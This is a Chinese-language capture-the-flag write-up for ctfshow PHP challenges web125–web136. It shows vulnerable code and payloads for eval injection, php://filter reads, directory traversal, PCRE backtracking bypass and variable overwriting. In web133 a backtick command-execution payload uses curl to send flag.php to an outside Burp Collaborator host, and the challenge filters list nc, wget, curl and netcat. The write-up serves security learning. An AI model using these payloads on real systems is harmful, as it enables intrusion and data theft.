class="language-none">GET: 1&#x3D;flag.phpPOST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;highlight_file($_GET[1])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221241502.png"></p><pre class="line-numbers language-none"><code class="language-none">highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;  if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d&#x2F;i&quot;, $c) &amp;&amp; strlen($c)&lt;&#x3D;16)&#123;     eval(&quot;$c&quot;.&quot;;&quot;);      if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;       echo $flag;     &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此题过滤了更多东西，仅能输出以下字符</p><blockquote><p> $&amp;():&lt;&gt;ABEHJKLMNPQRSTUVWXYZ[]_abehjklmnpqrstuvwxyz|</p></blockquote><p>上个大佬的wp在本题依然能使用，但官方wp就不行了，构造为</p><pre class="line-numbers language-none"><code class="language-none">GET: $fl0g&#x3D;flag_give_me;POST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;eval($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221248399.png"></p><p>上个parse_str函数也仍然能够调用，可以构造</p><pre class="line-numbers language-none"><code class="language-none">GET: 1+fl0g&#x3D;flag_give_mePOST: CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;2&amp;fun&#x3D;parse_str($a[1])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221250719.png"></p><p>不过本题实际想考查的是assert函数<a href="https://www.php.net/manual/zh/function.assert">PHP: assert - Manual</a></p><pre class="line-numbers language-none"><code class="language-none">assert(mixed $assertion, Throwable|string|null $description &#x3D; null): boolassertion可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。警告在 PHP 8.0.0 之前，如果 assertion 是 string，将解释为 PHP 代码，并通过 eval() 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除。description如果 description 是 Throwable 的实例，只有在 assertion 执行失败时才会抛出。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意<code>在 PHP 8.0.0 之前，如果 assertion 是 string，将解释为 PHP 代码</code></p><pre class="line-numbers language-none"><code class="language-none">GET: $fl0g&#x3D;flag_give_me POST: CTF_SHOW&#x3D;6&amp;CTF[SHOW.COM&#x3D;6&amp;fun&#x3D;assert($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show &#x3D; md5($flag);$url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];&#x2F;&#x2F;特殊字符检测function waf($url)&#123;  if(preg_match(&#39;&#x2F;\&#96;|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\&#x2F;&#x2F;&#39;, $url))&#123;    return true;  &#125;else&#123;    return false;  &#125;&#125;if(waf($url))&#123;  die(&quot;嗯哼？&quot;);&#125;else&#123;  extract($_GET);&#125;if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123;  echo $flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面学的<code>$_SERVER[‘QUERY_STRING’]会获取查询语句即GET传参?的语句</code>。然后在waf函数中会对$url进行过滤</p><p>如果含有<code>% &amp;=?ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz|</code>就会返回false</p><pre class="line-numbers language-none"><code class="language-none">extract() 函数从数组中将变量导入到当前的符号表。-----------------------------语法-----------------------------------------extract(array,extract_rules,prefix)参数描述array必需。规定要使用的数组。extract_rules可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。可能的值：EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。EXTR_SKIP - 如果有冲突，不覆盖已有的变量。EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。prefix可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们可以通过<code>$_SERVER[‘QUERY_STRING’]</code>获取?后的查询语句，即可以是最后这个if判断内的语句，即?ctf_show&#x3D;ilove36d。但是在preg_match这个过滤中，如果含有<code>_</code>就会导致返回<code>True</code>，但是返回<code>True</code>就会导致触发die函数，所以我们不能有<code>_</code>。这里可以用到空格绕过（即我们前面所遇到的一个php特性，当传参出现<code>空格</code>或<code>.</code>时会被替换为<code>_</code>,在该题中<code>.</code>被过滤了，但是<code>空格</code>没有，所以我们可以通过空格来使其在传参中转换为<code>ctf_show</code>以此达到目的）所以可以构造</p><pre class="line-numbers language-none"><code class="language-none">GET:  ctf show&#x3D;ilove36d或GET:  ctf%20show&#x3D;ilove36d    &#x2F;&#x2F;%20是空格的URLENCODE，<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221658038.png"></p><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 &#x3D; $_GET[&#39;f1&#39;];$f2 &#x3D; $_GET[&#39;f2&#39;];if(check($f1))&#123;  var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123;  echo &quot;嗯哼？&quot;;&#125;function check($str)&#123;  return !preg_match(&#39;&#x2F;[0-9]|[a-z]&#x2F;i&#39;, $str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>call_user_func</code>函数在前面我们学过， 把第一个参数作为回调函数调用。</p><p><code>check</code>函数则是对<code>str</code>进行一次过滤，返回没有数字和小写字母的字符</p><p>这题就是跟着佬wp复现了，首先我们要了解俩个函数<code>gettext</code>和<code>get_defined_vars</code></p><p>源代码中所有需要多语言支持的（需要翻译的）字符串都修改为使用<code>gettext</code>函数包装起来。为了方便也可以使用下划线<code>_</code>，即在php代码中，<code>gettext(&quot;nihao&quot;)</code>是等同于<code>_(&quot;nihao&quot;)</code>。因此虽然其过滤了小写字母，但是其没过滤<code>_</code>。其次是<code>get_defined_vars</code>函数，返回由所有已定义变量所组成的数组</p><p>可以构造</p><pre class="line-numbers language-none"><code class="language-none">?f1&#x3D;_&amp;f2&#x3D;get_defined_vars其效果就等同于var_dump(call_user_func(call_user_func(_,get_defined_vars)))  &#x2F;&#x2F;这里的 &#39;get_defined_vars&#39; 将被翻译成当前语言环境中的对应字符串，然后作为回调函数的名字传递给 call_user_func。&#x3D;&gt; var_dump(call_user_func(get_defined_vars));   &#x2F;&#x2F;回调get_defined_vars函数&#x3D;&gt; var_dump(get_defined_vars);  &#x2F;&#x2F;执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221734271.png"></p><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;f&#39;]))&#123;  $f &#x3D; $_GET[&#39;f&#39;];  if(stripos($f, &#39;ctfshow&#39;)&gt;0)&#123;    echo readfile($f);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">首先先来了解俩个函数stripos — 查找字符串首次出现的位置（不区分大小写）------------------------语法-------------------------------stripos(string,find,start)参数描述string必需。规定被搜索的字符串。find必需。规定要查找的字符。start可选。规定开始搜索的位置。-------------------------相关函数------------------------------------strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）readfile() 函数读取一个文件，并写入到输出缓冲。-------------------------语法-------------------------------readfile(filename,include_path,context)参数描述filename必需。规定要读取的文件。include_path可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 &#39;1&#39;。context可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是需要$f中可以查到’ctfshow’这个字符。然后再通过readfile函数读取这个文件，我们可以通过俩种方式，</p><h4 id="第一种、伪协议读取"><a href="#第一种、伪协议读取" class="headerlink" title="第一种、伪协议读取"></a>第一种、伪协议读取</h4><pre class="line-numbers language-none"><code class="language-none">f&#x3D;php:&#x2F;&#x2F;filter&#x2F;|ctfshow&#x2F;resource&#x3D;flag.phporf&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;以base64形式读取，相对应的，方式还有很多。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>打开源代码可以看到flag.php的内容</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221833652.png"></p><h4 id="第二种、目录遍历"><a href="#第二种、目录遍历" class="headerlink" title="第二种、目录遍历"></a>第二种、目录遍历</h4><p>通过目录遍历来允许访问目标目录结构之外的文件，访问到flag.php的内容，该路径通过多次跳出目录结构最终指向了 <code>var/www/html/flag.php</code>。</p><pre class="line-numbers language-none"><code class="language-none">f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php  &#x2F;&#x2F;直接读取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上，打开源代码可以找到flag的值。</p><h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;f&#39;]))&#123;  $f &#x3D; $_POST[&#39;f&#39;];  if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;    die(&#39;bye!&#39;);  &#125;  if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;    die(&#39;bye!!&#39;);  &#125;  echo $flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="第一种、pcre回溯"><a href="#第一种、pcre回溯" class="headerlink" title="第一种、pcre回溯"></a>第一种、pcre回溯</h4><p>这题结合代码一边<code>stripos函数</code>要让你有ctfshow，否则就会触发<code>die函数</code>，但是如果你有ctfshow又会触发<code>preg_match函数</code>从而引起<code>die函数</code>的触发，这里就要利用到<code>preg_match函数</code>的另一个绕过方式—-<code>pcre回溯限制次数绕过</code></p><blockquote><p>PCRE（Perl Compatible Regular Expressions）是一种正则表达式库，它使用回溯法来匹配模式。回溯法在匹配失败时会尝试不同的路径，这可能导致在某些情况下耗费大量的时间和资源。                                          回溯限制是为了防止正则表达式匹配时发生无限循环或导致系统资源耗尽。然而，有些情况下，攻击者可能会尝试绕过回溯限制，导致正则表达式引擎消耗大量时间而不断尝试匹配。                                                             基本的原理通常包括利用正则表达式中的复杂结构和重复元素，使得引擎在尝试匹配时需要进行大量的回溯。攻击者可能会通过构造特定的输入，使得正则表达式引擎在回溯时达到限制次数，然后通过巧妙的修改输入，绕过这一限制，导致正则表达式引擎消耗大量的资源。</p><p>贪婪模式下，pattern部分被匹配，但是后半部分没匹配（匹配“用力过猛”，把后面的部分也匹配过了）时匹配式回退的操作，在出现<em>、+时容易产生。<br>非贪婪模式下，字符串部分被匹配，但后半部分没匹配完全（匹配“用力不够”，需要通配符再匹配一定的长度），在出现</em>?、+?时容易产生。</p></blockquote><p>所以我们可以编写下面的代码(pycharm)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c582f986-75b4-4071-b510-84deb566bb3f.challenge.ctf.show&#x2F;&quot;data &#x3D; &#123;    &#39;f&#39;:&#39;abcd&#39;*250000+&#39;ctfshow&#39;&#125;r &#x3D; requests.post(url,data&#x3D;data)print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401231126355.png"></p><h4 id="第二种、数组绕过"><a href="#第二种、数组绕过" class="headerlink" title="第二种、数组绕过"></a>第二种、数组绕过</h4><p>preg_match不识别数组，否则返回false，并且<code>stripos函数</code>会返回<code>null</code>,<code>null!=false</code>,所以可以绕过stripos函数</p><p>所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">f[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时preg_match不识别数组，返回false，所以绕过了这个die函数，然后stripos函数也会返回NULL，同时NULL!&#x3D;false，所以不触发die函数。</p><h4 id="第三种、php特性"><a href="#第三种、php特性" class="headerlink" title="第三种、php特性"></a>第三种、php特性</h4><pre class="line-numbers language-none"><code class="language-none">在正则表达式中: . 表示任意单个字符，+ 表示必须匹配1次或多次，+? 表示重复1次或更多次，并且其皆在ctfshow前面。所以在ctfshow前面必须有字符，才会导致触发die函数。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以构造playload：</p><pre class="line-numbers language-none"><code class="language-none">f&#x3D;ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;f&#39;]))&#123;  $f &#x3D; (String)$_POST[&#39;f&#39;];  if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;    die(&#39;bye!&#39;);  &#125;  if(stripos($f,&#39;36Dctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;    die(&#39;bye!!&#39;);  &#125;  echo $flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与上一题相比，其对将从<code>$_POST</code>数组中获取到的数据转换为字符串类型，再加上<code>stripos函数</code>中需要查询36Dctfshow，这就导致了ctfshow前面出现了<code>字符</code>，所以导致了<code>preg_match函数</code>判断为真，触发了die函数。对其使用pcre回溯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;ed6dabb2-edf3-48d0-9da0-b2bc4ce1c139.challenge.ctf.show&#x2F;&quot;data &#x3D; &#123;    &#39;f&#39;:&#39;abcd&#39;*250000+&#39;36Dctfshow&#39;&#125;r &#x3D; requests.post(url,data&#x3D;data)print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401231912317.png"></p><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>打开就是一个网站</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401231928587.png"></p><p>通过御剑扫出有隐藏文件(admin和index.php?.php)</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401232001714.png"></p><p>分别进行访问，先去index.php?.php下进行访问查看，额发现就是回到了主页面</p><p>再去<code>admin</code>下进行访问查看，发现是一段源码，对源码进行分析</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;]))&#123;  $username &#x3D; (String)$_GET[&#39;username&#39;];  $password &#x3D; (String)$_GET[&#39;password&#39;];  $code &#x3D; (String)$_GET[&#39;code&#39;];  if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;&quot;admin&quot;)&#123;      if($code &#x3D;&#x3D; &#39;admin&#39;)&#123;      echo $flag;    &#125;      &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先对传入的<code>username</code>、<code>password</code>、<code>code</code>进行字符串型的强类型转换。</p><p>然后运用了mt_rand函数，其次是逻辑关系<code>&amp;&amp;</code>与<code>||</code>。<strong>前者需要前后的条件都为true，才会返回true</strong>；<strong>后者则是只要前后一个为true，就会返回true。</strong>（||<code>优先级低于</code>&amp;&amp;）然后当<code>$code</code>为<code>admin</code>时就会得到flag</p><pre class="line-numbers language-none"><code class="language-none">mt_rand() 函数使用 Mersenne Twister 算法生成随机整数。-------------------语法-----------------------------------mt_rand();ormt_rand(min,max);参数描述min可选。规定返回的最小数。默认是 0。max可选。规定返回的最大数。默认是 mt_getrandmax()。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即先进行<code>&amp;&amp;</code>运算时，<code>$code</code>与<code>$password</code>都为假，那么则代表此时判断为<code>false || $username ===&quot;admin&quot;</code>，那么进行<code>||</code>运算，此时当<code>$username===&quot;admin&quot;</code>满足时，即代表该if判断此时为<code>if( false || true)</code>，即有一个<code>true</code>，那么该if判断就成立，然后确保下一个if判断中<code>$code == &#39;admin&#39;</code>即可拿到flag                                                                                                                                                  所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;1&amp;code&#x3D;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401232014991.png"></p><h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);&#x2F;&#x2F;flag.phpif($F &#x3D; @$_GET[&#39;F&#39;])&#123;  if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|netcat&#x2F;i&#39;, $F))&#123;    eval(substr($F,0,6));  &#125;else&#123;    die(&quot;6个字母都还不够呀?!&quot;);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在该代码中，首先过滤了几个日常使用的命令执行函数。并且限制了f的写入数量，因为<code>substr</code>函数只截断前六个字符，并且也给出了提示，flag在flag.php中</p><pre class="line-numbers language-none"><code class="language-none">substr() 函数返回字符串的一部分。注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。-----------------------语法---------------------------------substr(string,start,length)参数   描述string必需。规定要返回其中一部分的字符串。start必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始length可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按官方给的WP去复现了一遍(太菜了·····)</p><p><code>if($F = @$_GET[&#39;F&#39;])</code>不同于以往的GET传参，本题如果我们传参变量<code>$F</code>本身，会发生变量覆盖，以大佬给的实验命令为例，说一下我的理解(可能不对\ &#x2F;)。**?F&#x3D;<code>$F</code>;+sleep 3**,首先我们需要了解<strong>是shell_exec()函数的缩写，</strong>然后substr函数是提取前6位字符，将**<code>$F</code>;+<strong>给提取了出去，此时eval执行的命令为</strong><code>$F</code>;<strong>而$F此时所传的参即是</strong><code>$F</code>;+sleep 3**。所以我们最后执行的代码应该是 **``$F`;+sleep 3`**。</p><pre class="line-numbers language-none"><code class="language-none">即当我们为F赋参  F&#x3D;&#96;$F&#96;;+sleep(3)substr函数截断得前六个字符&#96;$F &#96;;+eval(substr($F,0,6));&#x3D;&gt;eval(&#96;$F &#96;;);&#x3D;&gt;eval(&#96;&#96;$F&#96;+;sleep 3&#96;);由于&#96;&#96;是shell_exec()函数的缩写。所以执行了&#96;$F&#96;;+sleep 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>且本题是无回显RCE。因此，可以利用<code>curl -F</code>函数将flag文件上传到Burp的 Collaborator Client</p><p>链接点击<code>复制到剪贴板</code>获得</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401241118058.png"></p><p>所以可以构造</p><pre class="line-numbers language-none"><code class="language-none">?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php http:&#x2F;&#x2F;vyxgokflbcdeezkngy6lpopzsqyjm8.burpcollaborator.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401241105666.png"></p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$key1 &#x3D; 0;$key2 &#x3D; 0;if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &#123;  die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);extract($_POST);if($key1 &#x3D;&#x3D; &#39;36d&#39; &amp;&amp; $key2 &#x3D;&#x3D; &#39;36d&#39;) &#123;  die(file_get_contents(&#39;flag.php&#39;));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$_SERVER[‘QUERY_STRING’]</code>会获取查询语句即GET传参?的语句</p><pre class="line-numbers language-none"><code class="language-none">extract() 函数从数组中将变量导入到当前的符号表。-----------------------------语法-----------------------------------------extract(array,extract_rules,prefix)参数描述array必需。规定要使用的数组。extract_rules可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。prefix可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>extract函数具体展现</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401241742833.png"></p><p>在该题中，如果我们<code>get</code>或<code>POST</code>传参就会触发<code>die函数</code>，所以我们需要先通过<code>$_SERVER[‘QUERY_STRING’]</code>将<code>?</code>后的请求解析为<code>变量</code>。然后通过extract函数特性将数组中的变量导入到当前的符号表。即可以实现<code>key1=36d和key2=36d</code>。其次利用到的就是extract函数中的变量为<code>$_POST</code>，利用变量覆盖，我们可以传参<code>_POST</code>从而实现上面这几步，所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">GET:  _POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401242123962.png"></p><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);&#x2F;&#x2F;flag.phpif($F &#x3D; @$_GET[&#39;F&#39;])&#123;  if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head&#x2F;i&#39;, $F))&#123;    eval(substr($F,0,6));  &#125;else&#123;    die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相较于<code>web133</code>，该题过滤掉了更多命令执行语句，在<code>web133</code>中我们使用到的<code>curl</code>也没法用咯，只能另想方法 可以通过cp命令将flag.php文件复制到另一个文件中，然后我们通过访问该文件拿到flag，其他的跟<code>web133</code>同理，我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">F&#x3D;&#96;$F&#96;; cp flag.php 1.txt       &#x2F;&#x2F;这样确保前六位是&#96;$F&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401251629678.png"></p><p>同理还有其他命令比如mv命令，当我们将flag.php移入其他文件中，如果没有该文件就会创建一个新文件，因此我们可以访问该新文件拿到flag</p><pre class="line-numbers language-none"><code class="language-none">GET:  F&#x3D;&#96;$F&#96;; mv flag.php 111.txt  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果与上图一致</p><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);function check($x)&#123;  if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;    die(&#39;too young too simple sometimes naive!&#39;);  &#125;&#125;if(isset($_GET[&#39;c&#39;]))&#123;  $c&#x3D;$_GET[&#39;c&#39;];  check($c);  exec($c);&#125;else&#123;  highlight_file(__FILE__);&#125;?&gt;<span aria-hidden="true" 